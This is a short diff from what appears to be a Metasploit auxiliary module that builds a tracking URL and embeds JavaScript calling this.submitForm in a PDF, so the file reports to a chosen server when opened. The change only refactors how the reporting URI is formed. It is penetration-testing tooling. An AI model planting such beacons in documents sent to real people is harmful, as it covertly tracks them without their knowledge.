@@ -25,8 +25,8 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-
-		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=msf_pdftrack"
+        uri = return_uri
+		reporting_uri = "#{uri}?target=#{datastore['BADGER_TGT']}&agent=msf_pdftrack"
 
 		script = %Q|
 		this.submitForm("#{reporting_uri}");
